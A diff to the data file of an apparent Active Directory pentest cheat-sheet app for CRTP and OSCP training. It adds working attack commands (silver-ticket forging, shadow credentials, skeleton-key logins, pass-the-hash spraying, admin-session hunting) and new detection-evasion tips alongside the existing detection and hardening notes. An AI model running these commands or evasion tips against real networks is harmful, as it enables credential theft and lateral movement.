+          "label": "Import SessionHunter",
+          "command": ". C:\\AD\\Tools\\Invoke-SessionHunter.ps1"
+        },
+        {
+          "label": "Map sessions (where are admins logged in?)",
+          "command": "Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access"
+        },
+        {
+          "label": "Hunt shares across the server list",
+          "command": "Import-Module C:\\AD\\Tools\\PowerHuntShares.psm1; Invoke-HuntSMBShares -NoPing -OutputDirectory C:\\AD\\Tools\\ -HostList C:\\AD\\Tools\\servers.txt"
+        }
+      ],
+      "examples": [
+        {
+          "label": "SessionHunter with access column",
+          "command": "Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\\AD\\Tools\\servers.txt | select Hostname,UserSession,Access"
+        },
+        {
+          "label": "PowerHuntShares report",
+          "command": "Invoke-HuntSMBShares -NoPing -OutputDirectory C:\\AD\\Tools\\ -HostList C:\\AD\\Tools\\servers.txt"
+        }
+      ],
+      "notes": "SessionHunter reads HKU via remote registry to find logged-on users without local admin - quieter than Get-NetSession loops and complements BloodHound Session data. PowerHuntShares scores shares by exposure (read/write, sensitive names) and flags excessive privileges. Use the results to pick a host where a Domain Admin is logged on (then steal their token/TGT) or a writable share for payload staging.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "Invoke-SessionHunter (GitHub)",
+          "url": "https://github.com/Leo4j/Invoke-SessionHunter"
+        },
+        {
+          "title": "PowerHuntShares (NetSPI)",
+          "url": "https://github.com/NetSPI/PowerHuntShares"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-bloodhound",
+          "note": "Cross-reference sessions/ACLs with BloodHound paths",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-credential-dumping",
+          "note": "Once you find a host with a DA session, dump their creds",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-powerview-userhunting",
+          "note": "PowerView Find-DomainUserLocation is the built-in alternative",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "prerequisites": "Domain user context. Network reachability to targets (SMB 445 for shares, remote registry for sessions).",
+        "why_it_works": "Logged-on users are discoverable via the Remote Registry service (HKU hives) and NetSessionEnum, and share ACLs are readable by any authenticated user - so an attacker can enumerate where privileged users sit and which data is exposed without touching the accounts themselves.",
+        "misconfiguration": "Remote Registry service enabled broadly; open/over-permissioned SMB shares (Everyone/Authenticated Users read-write); privileged users interactively logged into member servers (session sprawl).",
+        "impact": "A map of where Domain Admins are logged on (token/TGT theft targets) and which shares leak credentials/config - the shortlist for the next lateral-movement hop.",
+        "detection": "Bursts of remote-registry connections (Event 4624 type 3 to the RemoteRegistry pipe) from one host to many; mass SMB tree-connects to IPC$/shares (Event 5140) across the estate; scanner-like fan-out patterns.",
+        "artifacts": "Security 5140/5145 share-access events across many hosts; RemoteRegistry access events; PowerHuntShares output directory on the attacker host.",
+        "vulnerable_config": "# Remote Registry service = Automatic on member servers\n# Shares granting Everyone/Authenticated Users read (or write)\n# DAs logging into tier-1/2 servers interactively",
+        "secure_config": "# Disable Remote Registry where not required (GPO)\n# Least-privilege share ACLs; remove Everyone/Authenticated Users\n# Tiered admin: DAs only log on to DCs/PAWs\n# Alert on one host enumerating sessions/shares across many targets",
+        "prevention": "Disable Remote Registry broadly; tighten share ACLs; enforce admin tiering so privileged users never log into lower-tier hosts; alert on fan-out session/share enumeration. [MITRE M1028, M1022, M1026]",
+        "evasion": "-NoPortScan / -NoPing reduce noise; target a small server list instead of the whole domain; run from a host that legitimately talks to file servers.",
+        "sources": [
+          "CRTP",
+          "MITRE T1049",
+          "MITRE T1135"
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -61174,8 +64553,33 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1222.001",
           "MITRE T1078"
-        ]
-      }
+        ],
+        "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+      },
+      "variations": [
+        {
+          "label": "Grant yourself full control after takeown",
+          "command": "icacls '<target_file>' /grant <user>:F"
+        },
+        {
+          "label": "Recursive on a directory",
+          "command": "takeown /f '<target_dir>' /r /d y"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Take ownership of the protected file",
+          "command": "takeown /f '<target_file>'"
+        },
+        {
+          "label": "Grant read/full to yourself",
+          "command": "icacls '<target_file>' /grant <user>:F"
+        },
+        {
+          "label": "Read it (e.g. a config/hash/flag)",
+          "command": "type '<target_file>'"
+        }
+      ]
     },
     {
       "id": "ad-setspn-manual",
@@ -61246,7 +64650,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Built-in setspn.exe -Q */* queries registered SPNs using a native Windows binary - no tools dropped.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. setspn -Q lists registered SPNs (readable), revealing which accounts are Kerberoastable.",
         "prerequisites": "A domain-joined Windows session.",
         "impact": "The SPN inventory (roasting targets) gathered with a trusted built-in.",
         "detection": "[MITRE T1558.003] LDAP queries filtering on servicePrincipalName / userAccountControl (Event 4662; Defender for Identity recon); one host reading roastable-account attributes. setspn.exe execution in process logs (4688).",
@@ -61263,6 +64667,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "setspn"
+      ],
+      "variations": [
+        {
+          "label": "SPNs for a specific account",
+          "command": "setspn.exe -L <domain>\\<user>"
+        },
+        {
+          "label": "Forest-wide",
+          "command": "setspn.exe -T <forest> -Q */*"
+        }
       ]
     },
     {
@@ -61347,7 +64761,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
         "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Add a Key Credential (shadow creds)",
+          "command": "pywhisker --dc-ip <dc_ip> -d <domain> -u <user> -p <password> --target <victim> --action add"
+        }
+      ]
     },
     {
       "type": "command",
@@ -61548,6 +64968,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "SharpHound"
+      ],
+      "variations": [
+        {
+          "label": "Stealth (session loop, DC-only)",
+          "command": ".\\SharpHound.exe -c DCOnly --zipfilename bh"
+        },
+        {
+          "label": "Loop sessions over time",
+          "command": ".\\SharpHound.exe -c Session --loop --loopduration 02:00:00"
+        },
+        {
+          "label": "ADRecon (Excel report, alt to BloodHound)",
+          "command": ".\\ADRecon.ps1 -DomainController <dc> -Credential <domain>\\<user>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Collect all methods",
+          "command": ".\\SharpHound.exe -c All --zipfilename bh"
+        },
+        {
+          "label": "Import the zip into BloodHound",
+          "command": "# drag-drop zip -> run 'Shortest paths to Domain Admins'"
+        }
       ]
     },
     {
@@ -61623,7 +65067,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "SharpView is a .NET port of PowerView for LDAP AD enumeration where PowerShell is constrained/monitored.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. SharpView is PowerView compiled to C#, so it performs the same authenticated LDAP reads without loading PowerShell (evades PS logging).",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "PowerView-style enumeration via a compiled binary.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -61640,6 +65084,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "SharpView"
+      ],
+      "variations": [
+        {
+          "label": "Any PowerView function, compiled",
+          "command": ".\\SharpView.exe Get-DomainGroupMember -Identity 'Domain Admins'"
+        }
       ]
     },
     {
@@ -61744,7 +65194,7 @@ const COMMAND_DATA = {
       "name": "Shellter AV Evasion (PE Injection)",
       "command": "shellter",
       "platform": "windows",
-      "category": "Defense Evasion",
+      "category": "Exploitation",
       "subcategory": "AV Bypass",
       "type": "command",
       "description": "Shellter is a dynamic PE infector that injects shellcode into a legitimate Windows 32-bit executable, making it appear as a normal program while executing a payload. Used in OSCP to bypass AV when delivering msfvenom payloads.",
@@ -62235,6 +65685,11 @@ const COMMAND_DATA = {
           "id": "crtp-diamond-ticket",
           "note": "Diamond ticket as stealthier alternative",
           "rel": "alternative"
+        },
+        {
+          "id": "crtp-psremoting",
+          "rel": "next",
+          "note": "Use the forged service ticket (HTTP/WSMAN) to move laterally to the target host"
         }
       ],
       "notes": "Silver tickets never contact KDC for TGS — no event 4769. Stealthy but limited to specific service. Machine$ accounts for host/cifs.",
@@ -62262,7 +65717,21 @@ const COMMAND_DATA = {
         "misconfiguration": "Service accounts have weak/old NTLM hashes (from Kerberoasting). No PAC validation enabled on services. gMSA not used. No monitoring for KDC-bypass authentication patterns.",
         "vulnerable_config": "# Service account with stale NTLM hash (Kerberoasted + cracked):\n# MSSQL running as svc_sql with password 'Sql2018!' — same hash for 5 years\n# Silver ticket for MSSQLSvc/server.corp.local forged → full DB access as DA\n\n# PAC validation disabled (default — services don't validate PAC with DC):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 0 (or absent)",
         "secure_config": "# Use gMSA for all service accounts (auto-rotating passwords every 30 days):\nNew-ADServiceAccount -Name 'svc_sql' -DNSHostName 'sql.corp.local' -ManagedPasswordIntervalInDays 30\n\n# Enable PAC validation (forces DC contact for each auth — catches forged PACs):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ValidateKdcPacSignature = 1\n# Note: performance impact — evaluate per-environment\n\n# Monitor for Kerberos auth without prior KDC exchange:\n# MDI: 'Suspected Kerberos forged ticket (silver ticket)' alert — enabled by default\n\n# Rotate compromised service account passwords immediately:\nSet-ADAccountPassword svc_sql -Reset -NewPassword (ConvertTo-SecureString (New-Guid) -AsPlainText -Force)"
-      }
+      },
+      "variations": [
+        {
+          "label": "CIFS service (file access)",
+          "command": "Rubeus.exe silver /service:cifs/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
+        },
+        {
+          "label": "HOST service (schtasks/wmi)",
+          "command": "Rubeus.exe silver /service:host/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
+        },
+        {
+          "label": "Mimikatz",
+          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<host_fqdn> /service:cifs /rc4:<machine_hash> /ptt"
+        }
+      ]
     },
     {
       "id": "crtp-skeleton-key",
@@ -62358,7 +65827,13 @@ const COMMAND_DATA = {
         "misconfiguration": "LSASS PPL disabled on DCs (common on older DCs — PPL requires Secure Boot or explicit configuration). EDR not deployed on DCs. MDI not deployed. DCs not rebooted regularly (patch persists longer).",
         "vulnerable_config": "# LSASS PPL disabled on DC:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').RunAsPPL\n# Returns $null or 0 = PPL NOT enabled on DC = LSASS patchable\n\n# EDR absent on DC:\n# Get-Service CsFalconService,MDEClient  # Not found = no EDR on DC\n\n# Result: Skeleton Key injected via Mimikatz:\n# sekurlsa::skeleton\n# DC LSASS patched — password 'mimikatz' now works for all domain users",
         "secure_config": "# Enable LSASS PPL on DCs:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -Value 1\n# With Secure Boot: Set RunAsPPLBoot = 1 in addition\n\n# Via GPO:\n# Computer Config → Admin Templates → MS Security Guide\n# → Configure LSASS to run as a protected process: Enabled\n\n# Deploy MDI on all DCs:\n# MDI 'Skeleton Key malware attack' detection is built-in\n\n# Deploy EDR (Defender for Endpoint) on DCs:\n# LSASS Memory → PsProtectedSignerWindows-Light verification\n\n# Sysmon Rule on DCs:\n# <ProcessAccess onmatch='include'>\n#   <TargetImage condition='is'>C:\\Windows\\System32\\lsass.exe</TargetImage>\n# </ProcessAccess>"
-      }
+      },
+      "variations": [
+        {
+          "label": "Then auth with the master password 'mimikatz'",
+          "command": "# any DA account now accepts password: mimikatz  (dir \\\\<dc>\\C$ /user:Administrator mimikatz)"
+        }
+      ]
     },
     {
       "type": "command",
@@ -62462,7 +65937,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "SMB null sessions are allowed — the server accepts anonymous (unauthenticated) IPC$ connections, exposing share lists, user lists, password policy, and domain information. On older Windows versions (pre-2008 R2) this was the default. On modern systems it can be re-enabled by misconfiguration or GPO rollback. Additionally, SMB signing may be disabled, enabling relay attacks.",
         "vulnerable_config": "# Windows Registry — null sessions enabled:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RestrictAnonymous = 0      <-- allows null session enumeration\n#   RestrictAnonymousSAM = 0   <-- exposes SAM account list anonymously\n\n# SMB signing disabled (relay attack enabler):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RequireSecuritySignature = 0\n#   EnableSecuritySignature  = 0\n\n# Verify current state:\nGet-SmbServerConfiguration | Select-Object EnableSMBQUIC,RequireSecuritySignature",
-        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled"
+        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled",
+        "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host — target only what you need."
       }
     },
     {
@@ -62548,7 +66024,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "SMB signing disabled (default on workstations) enables NTLM relay attacks — an attacker intercepts NTLMv2 hashes via LLMNR/NBT-NS poisoning and relays them to SMB targets. RCE via SMB requires only a valid local admin credential (or hash). Password spray succeeds when weak/shared passwords exist.",
         "vulnerable_config": "# SMB signing disabled on workstations (Windows default):\nGet-SmbServerConfiguration | Select-Object RequireSecuritySignature\n# RequireSecuritySignature: False  <- relay attacks work\n\n# Any authenticated user can spray:\n# No lockout policy = try one password against 1000 users\n# netexec smb <dc_ip> -u users.txt -p 'Summer2024!' --continue-on-success",
-        "secure_config": "# Enable SMB signing everywhere:\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled\n\n# Disable LLMNR + NBT-NS (see responder card)\n# Account lockout policy: 5 attempts, 30-min window\n# Firewall: block SMB between workstations (allow only to file servers/DCs)"
+        "secure_config": "# Enable SMB signing everywhere:\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled\n\n# Disable LLMNR + NBT-NS (see responder card)\n# Account lockout policy: 5 attempts, 30-min window\n# Firewall: block SMB between workstations (allow only to file servers/DCs)",
+        "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host — target only what you need."
       },
       "variations": [
         {
@@ -62644,7 +66121,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# SMB signing disabled on workstations (Windows default):\nGet-SmbServerConfiguration | Select-Object RequireSecuritySignature\n# RequireSecuritySignature: False  <- relay attacks work\n\n# Any authenticated user can spray:\n# No lockout policy = try one password against 1000 users\n# netexec smb <dc_ip> -u users.txt -p 'Summer2024!' --continue-on-success",
         "secure_config": "# Enable SMB signing everywhere:\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled\n\n# Disable LLMNR + NBT-NS (see responder card)\n# Account lockout policy: 5 attempts, 30-min window\n# Firewall: block SMB between workstations (allow only to file servers/DCs)"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "NetExec + only show hits",
+          "command": "nxc smb <ip> -u <userlist> -p '<password>' --continue-on-success | grep +"
+        },
+        {
+          "label": "Pass-the-hash spray",
+          "command": "crackmapexec smb <cidr> -u administrator -H <nt_hash> --local-auth | grep +"
+        }
+      ]
     },
     {
       "type": "command",
@@ -62750,8 +66237,15 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "SMB null sessions are allowed — the server accepts anonymous (unauthenticated) IPC$ connections, exposing share lists, user lists, password policy, and domain information. On older Windows versions (pre-2008 R2) this was the default. On modern systems it can be re-enabled by misconfiguration or GPO rollback. Additionally, SMB signing may be disabled, enabling relay attacks.",
         "vulnerable_config": "# Windows Registry — null sessions enabled:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RestrictAnonymous = 0      <-- allows null session enumeration\n#   RestrictAnonymousSAM = 0   <-- exposes SAM account list anonymously\n\n# SMB signing disabled (relay attack enabler):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RequireSecuritySignature = 0\n#   EnableSecuritySignature  = 0\n\n# Verify current state:\nGet-SmbServerConfiguration | Select-Object EnableSMBQUIC,RequireSecuritySignature",
-        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled"
-      }
+        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled",
+        "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host — target only what you need."
+      },
+      "variations": [
+        {
+          "label": "Enumerate users (null session)",
+          "command": "rpcclient -U \"\" -N <ip> -c enumdomusers"
+        }
+      ]
     },
     {
       "type": "command",
@@ -62842,10 +66336,6 @@ const COMMAND_DATA = {
       "description": "Enumerate SMB shares over a null session, then connect to read files. smbmap and crackmapexec give share permissions at a glance.",
       "variations": [
         {
-          "label": "List shares (null session)",
-          "command": "smbclient -N -L //<ip>"
-        },
-        {
           "label": "Connect to a share (null session)",
           "command": "smbclient //<ip>/notes"
         },
@@ -62896,7 +66386,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "SMB null sessions are allowed — the server accepts anonymous (unauthenticated) IPC$ connections, exposing share lists, user lists, password policy, and domain information. On older Windows versions (pre-2008 R2) this was the default. On modern systems it can be re-enabled by misconfiguration or GPO rollback. Additionally, SMB signing may be disabled, enabling relay attacks.",
         "vulnerable_config": "# Windows Registry — null sessions enabled:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RestrictAnonymous = 0      <-- allows null session enumeration\n#   RestrictAnonymousSAM = 0   <-- exposes SAM account list anonymously\n\n# SMB signing disabled (relay attack enabler):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RequireSecuritySignature = 0\n#   EnableSecuritySignature  = 0\n\n# Verify current state:\nGet-SmbServerConfiguration | Select-Object EnableSMBQUIC,RequireSecuritySignature",
-        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled"
+        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled",
+        "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host — target only what you need."
       }
     },
     {
@@ -62952,14 +66443,10 @@ const COMMAND_DATA = {
         }
       ],
       "id": "gs-smb-enum",
-      "name": "SMB - Share Enumeration",
+      "name": "SMB - Share Enumeration (Getting Started)",
       "command": "smbclient -N -L \\\\\\\\<ip>",
       "description": "List SMB shares (-N null session, -L list) then connect to interesting ones as guest or with credentials to pull files.",
       "variations": [
-        {
-          "label": "List shares (null session)",
-          "command": "smbclient -N -L \\\\\\\\<ip>"
-        },
         {
           "label": "Connect as guest",
           "command": "smbclient \\\\\\\\<ip>\\\\users"
@@ -63076,7 +66563,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "SMB null sessions are allowed — the server accepts anonymous (unauthenticated) IPC$ connections, exposing share lists, user lists, password policy, and domain information. On older Windows versions (pre-2008 R2) this was the default. On modern systems it can be re-enabled by misconfiguration or GPO rollback. Additionally, SMB signing may be disabled, enabling relay attacks.",
         "vulnerable_config": "# Windows Registry — null sessions enabled:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RestrictAnonymous = 0      <-- allows null session enumeration\n#   RestrictAnonymousSAM = 0   <-- exposes SAM account list anonymously\n\n# SMB signing disabled (relay attack enabler):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RequireSecuritySignature = 0\n#   EnableSecuritySignature  = 0\n\n# Verify current state:\nGet-SmbServerConfiguration | Select-Object EnableSMBQUIC,RequireSecuritySignature",
-        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled"
+        "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled",
+        "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host — target only what you need."
       }
     },
     {
@@ -63143,7 +66631,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "smbmap lists SMB shares and access levels across hosts using credentials, mapping readable/writable data.",
+        "why_it_works": "Authenticated (or null) SMB sessions can list shares and their read/write permissions, so smbmap maps what data your account can reach.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "A share/access map for pillaging.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -63160,6 +66648,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "smbmap"
+      ],
+      "variations": [
+        {
+          "label": "Pass-the-hash",
+          "command": "smbmap -u <user> -H <nt_hash> -d <domain> -H <target>"
+        },
+        {
+          "label": "Run a command (if admin)",
+          "command": "smbmap -u <user> -p <password> -H <target> -x 'whoami'"
+        }
       ]
     },
     {
@@ -63234,10 +66732,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Recurse Share",
-          "command": "smbmap -H <ip> -r <share>"
-        },
-        {
           "label": "Download",
           "command": "smbmap -H <ip> --download \"<share>\\<file>\""
         },
@@ -63252,7 +66746,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Enumerates and reads/writes accessible SMB shares (with creds or null/guest) to pillage files or plant payloads.",
+        "why_it_works": "Over-permissioned share ACLs (Everyone/Authenticated Users write) let any user read or drop files — useful for looting data or staging payloads/coercion files.",
         "prerequisites": "SMB access (creds or null/guest) to the target shares.",
